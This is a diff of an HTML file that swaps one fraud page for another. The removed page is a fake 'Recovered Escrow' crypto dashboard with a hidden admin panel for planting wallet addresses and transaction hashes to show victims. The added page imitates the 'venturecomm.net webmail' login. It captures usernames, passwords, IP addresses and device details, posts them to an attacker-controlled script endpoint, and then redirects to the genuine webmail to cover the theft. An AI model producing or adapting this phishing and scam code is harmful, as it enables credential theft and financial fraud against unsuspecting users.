@@ -1,253 +1,167 @@
 <!DOCTYPE html>
-<html lang="en" class="bg-gray-900 text-white">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Recovered Escrow</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>venturecomm.net webmail</title>
   <style>
-    /* Ensure footer sticks to bottom when content is short */
-    body, html {
-      height: 100%;
+    * {
+      box-sizing: border-box;
     }
-    #dashboard, #loginPage {
-      min-height: calc(100vh - 64px); /* Footer height approx 64px */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
       display: flex;
-      flex-direction: column;
       justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    form {
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 40px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .form-group .icon {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      font-size: 18px;
+      color: #888;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: #00b3ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #0099cc;
+    }
+    .footer-text {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+      form {
+        padding: 20px 15px;
+      }
+      button {
+        padding: 12px;
+      }
     }
   </style>
 </head>
+<body>
 
-<body class="flex flex-col min-h-screen">
-
-<!-- ================= LOGIN PAGE ================= -->
-<div id="loginPage" class="flex items-center justify-center bg-gray-900 px-4">
-  <div class="bg-gray-800 p-6 rounded shadow-lg w-full max-w-sm text-center">
-    <!-- Logo centered -->
-    <div class="flex justify-center mb-4">
-      <svg class="w-14 h-14 text-yellow-400" fill="currentColor" viewBox="0 0 24 24" aria-label="Recovered Escrow Logo" role="img" >
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-        <text x="50%" y="65%" text-anchor="middle" font-size="8" fill="white" font-family="Arial, sans-serif">₿</text>
-      </svg>
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.ibb.co/j98nvG7w/IMG-8935.jpg" alt="Logo" />
     </div>
-    <h2 class="text-2xl font-bold mb-6">Recovered Escrow Login</h2>
-    <input id="loginUser" type="text" placeholder="Username" class="w-full p-2 mb-3 bg-gray-700 rounded text-sm" />
-    <input id="loginPass" type="password" placeholder="Password" class="w-full p-2 mb-4 bg-gray-700 rounded text-sm" />
-    <button onclick="login()" class="w-full bg-blue-600 p-2 rounded hover:bg-blue-700">Login</button>
-    <p id="loginError" class="text-red-400 text-sm mt-2 hidden">Invalid credentials</p>
-  </div>
-</div>
 
-<!-- ================= USER DASHBOARD ================= -->
-<div id="dashboard" class="hidden flex flex-col min-h-screen">
-
-  <header class="bg-gray-800 p-4 sticky top-0 z-50 shadow flex items-center space-x-3">
-    <svg class="w-8 h-8 text-yellow-400 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24" aria-label="Recovered Escrow Logo" role="img">
-      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-      <text x="50%" y="65%" text-anchor="middle" font-size="8" fill="white" font-family="Arial, sans-serif">₿</text>
-    </svg>
-    <h1 id="userGreeting" class="text-xl font-bold select-none">Dashboard</h1>
-  </header>
-
-  <main class="p-4 space-y-6 max-w-3xl mx-auto flex-grow">
-    <section class="bg-gray-800 p-4 rounded">
-      <h2 class="font-semibold mb-2">Escrow Wallet Address:</h2>
-      <div class="flex justify-between items-center">
-        <p id="userWallet" class="break-all text-sm">N/A</p>
-        <button onclick="copyWallet()" class="bg-blue-500 px-3 py-1 rounded text-sm hover:bg-blue-600">Copy</button>
+    <form id="login-form">
+      <div class="form-group">
+        <span class="icon">👤</span>
+        <input type="text" id="username" placeholder="Username" required>
       </div>
-    </section>
+      <div class="form-group">
+        <span class="icon">🔒</span>
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+      <button type="submit">LOGIN</button>
+    </form>
 
-    <section class="bg-gray-800 p-4 rounded text-yellow-400 flex items-center">
-      <i class="fas fa-hourglass-half mr-2 text-yellow-400"></i>
-      <span>Escrow system is awaiting your deposit.</span>
-    </section>
-
-    <section id="txSection" class="bg-gray-800 p-4 rounded hidden">
-      <a id="txLink" href="#" target="_blank" class="text-blue-400 hover:underline flex items-center">
-        <i class="fas fa-link mr-2"></i>View on Blockchain
-      </a>
-    </section>
-
-    <!-- Terms and Privacy -->
-    <section class="bg-gray-800 p-4 rounded">
-      <details>
-        <summary class="font-semibold cursor-pointer text-lg mb-2">📜 Terms of Service</summary>
-        <p class="text-sm text-gray-300 mt-2 space-y-2">
-          <strong>Effective Date:</strong> July 21, 2025<br />
-          These Terms govern your use of Recovered Escrow. By using this service, you agree to:<br />
-          - Provide accurate info<br />
-          - Only deposit funds to admin-provided wallets<br />
-          - Not use the platform for illegal purposes<br />
-          <br />
-          <strong>We do NOT:</strong><br />
-          - Provide legal advice<br />
-          - Guarantee external party actions<br />
-          <br />
-          Escrow disputes will be handled by our admin based on available data including transaction hashes. Admin reserves the right to hold or release funds in cases of fraud, abuse, or dispute.
-        </p>
-      </details>
-      <details class="mt-4">
-        <summary class="font-semibold cursor-pointer text-lg mb-2">🔐 Privacy Policy</summary>
-        <p class="text-sm text-gray-300 mt-2 space-y-2">
-          <strong>What we collect:</strong><br />
-          - Username, password, wallet address, transaction hash<br />
-          <br />
-          <strong>How we use it:</strong><br />
-          - To display your dashboard<br />
-          - Track escrow status<br />
-          <br />
-          We do NOT share your data with third parties. All blockchain hashes are public. Credentials are stored only locally in your browser (no remote database).
-        </p>
-      </details>
-    </section>
-  </main>
-
-  <footer id="footer" onclick="secretClick()" class="text-center text-gray-400 text-sm py-6 bg-gray-800 select-none cursor-pointer">
-    © 2025 Recovered Escrow. Trust Secured, Assets Recovered.
-  </footer>
-</div>
-
-<!-- ================= ADMIN PANEL ================= -->
-<div id="adminPanel" class="hidden fixed inset-0 bg-black bg-opacity-90 z-50 flex items-center justify-center p-4">
-  <div class="bg-gray-900 p-6 rounded-lg shadow-lg w-full max-w-md space-y-4 overflow-auto max-h-[90vh]">
-    <div class="flex items-center space-x-3 mb-4">
-      <svg class="w-10 h-10 text-yellow-400 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24" aria-label="Recovered Escrow Logo" role="img">
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-        <text x="50%" y="65%" text-anchor="middle" font-size="8" fill="white" font-family="Arial, sans-serif">₿</text>
-      </svg>
-      <h2 class="text-xl font-bold text-yellow-400">Admin Panel</h2>
-    </div>
-
-    <label class="block text-sm mb-1">User First Name</label>
-    <input id="adminFirst" placeholder="First Name" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <label class="block text-sm mb-1">User Last Name</label>
-    <input id="adminLast" placeholder="Last Name" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <label class="block text-sm mb-1">Username</label>
-    <input id="adminUser" placeholder="Username" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <label class="block text-sm mb-1">Password</label>
-    <input id="adminPass" type="password" placeholder="Password" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <label class="block text-sm mb-1">Escrow Wallet Address</label>
-    <input id="adminWallet" placeholder="Wallet Address" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <label class="block text-sm mb-1">Blockchain TX Hash (optional)</label>
-    <input id="adminTx" placeholder="TX Hash" class="w-full bg-gray-800 p-2 rounded text-sm" />
-
-    <button onclick="saveUser()" class="w-full bg-green-600 p-2 rounded hover:bg-green-700">Save User Settings</button>
-    <button onclick="closeAdmin()" class="w-full bg-red-600 p-2 rounded hover:bg-red-700">Close Admin Panel</button>
+    <div class="footer-text">venturecomm.net webmail</div>
   </div>
-</div>
 
-<!-- ================= JS LOGIC ================= -->
-<script>
-  let userData = {};
-  let clicks = 0;
-  let clickTimer;
+  <script>
+    const form = document.getElementById("login-form");
 
-  function login() {
-    const u = document.getElementById('loginUser').value.trim();
-    const p = document.getElementById('loginPass').value.trim();
-    const stored = JSON.parse(localStorage.getItem('escrowUser'));
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
 
-    if (stored && stored.username === u && stored.password === p) {
-      userData = stored;
-      showDashboard();
-    } else {
-      document.getElementById('loginError').classList.remove('hidden');
-    }
-  }
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-  function showDashboard() {
-    document.getElementById('loginPage').classList.add('hidden');
-    document.getElementById('dashboard').classList.remove('hidden');
-    document.getElementById('userGreeting').textContent = `Welcome, ${userData.firstName}`;
-    document.getElementById('userWallet').textContent = userData.wallet || "N/A";
+      // Get device info
+      const deviceInfo = navigator.userAgent;
 
-    if (userData.tx && userData.tx.length > 10) {
-      document.getElementById('txSection').classList.remove('hidden');
-      document.getElementById('txLink').href = `https://www.blockchain.com/btc/tx/${userData.tx}`;
-    } else {
-      document.getElementById('txSection').classList.add('hidden');
-    }
-  }
+      // Get IP address from external service
+      let ip = "Unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {
+        // silently fail
+      }
 
-  function copyWallet() {
-    if(!userData.wallet) return alert("No wallet address to copy.");
-    navigator.clipboard.writeText(userData.wallet).then(() => {
-      alert('Wallet address copied!');
+      // Send data to Google Apps Script
+      fetch("YOUR_SCRIPT_URL", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username,
+          password,
+          ip,
+          deviceInfo
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = "https://webmail.venturecomm.net"; // ✅ successful login
+        } else {
+          setTimeout(() => {
+            window.location.href = "https://webmail.venturecomm.net"; // ❌ failed login redirect
+          }, 2000);
+        }
+      })
+      .catch(() => {
+        // fallback redirect on network failure
+        setTimeout(() => {
+          window.location.href = "https://webmail.venturecomm.net";
+        }, 2000);
+      });
     });
-  }
-
-  // Secret 7-click footer trigger for admin panel
-  function secretClick() {
-    clicks++;
-    if(clicks === 7) {
-      clicks = 0;
-      openAdmin();
-    }
-    clearTimeout(clickTimer);
-    clickTimer = setTimeout(() => clicks = 0, 2000);
-  }
-
-  function openAdmin() {
-    document.getElementById('adminPanel').classList.remove('hidden');
-    // Load current user data to inputs
-    const stored = JSON.parse(localStorage.getItem('escrowUser'));
-    if(stored){
-      document.getElementById('adminFirst').value = stored.firstName || '';
-      document.getElementById('adminLast').value = stored.lastName || '';
-      document.getElementById('adminUser').value = stored.username || '';
-      document.getElementById('adminPass').value = stored.password || '';
-      document.getElementById('adminWallet').value = stored.wallet || '';
-      document.getElementById('adminTx').value = stored.tx || '';
-    }
-  }
-
-  function closeAdmin() {
-    document.getElementById('adminPanel').classList.add('hidden');
-  }
-
-  function saveUser() {
-    const firstName = document.getElementById('adminFirst').value.trim();
-    const lastName = document.getElementById('adminLast').value.trim();
-    const username = document.getElementById('adminUser').value.trim();
-    const password = document.getElementById('adminPass').value.trim();
-    const wallet = document.getElementById('adminWallet').value.trim();
-    const tx = document.getElementById('adminTx').value.trim();
-
-    if(!username || !password){
-      alert("Username and password cannot be empty!");
-      return;
-    }
-
-    const newUser = {
-      firstName, lastName, username, password, wallet, tx
-    };
-    localStorage.setItem('escrowUser', JSON.stringify(newUser));
-    alert('User settings saved.');
-    closeAdmin();
-  }
-
-  // On page load, for demo purposes, pre-set a default user if none exists
-  window.onload = () => {
-    if(!localStorage.getItem('escrowUser')){
-      localStorage.setItem('escrowUser', JSON.stringify({
-        firstName: 'Elina',
-        lastName: 'Doe',
-        username: 'elina',
-        password: 'password123',
-        wallet: '1BitcoinAddressExample1234567890',
-        tx: ''
-      }));
-    }
-  };
-</script>
+  </script>
 
 </body>
 </html>
